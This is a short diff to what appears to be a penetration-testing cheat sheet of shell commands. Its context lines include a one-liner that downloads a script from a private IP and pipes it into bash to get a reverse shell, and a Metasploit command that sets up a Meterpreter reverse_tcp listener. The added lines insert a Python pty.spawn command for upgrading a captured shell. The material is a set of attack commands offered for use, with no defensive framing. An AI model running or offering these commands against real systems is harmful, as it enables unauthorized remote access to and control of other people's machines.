@@ -22,6 +22,10 @@ TOP DOG reverse shell `curl http://192.168.45.152:8000/shell.sh | bash`
 
 `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`
 
+### Python Semi-intetractive TTY
+
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
 ### Fully Interactive TTY Upgrade
 
 ```
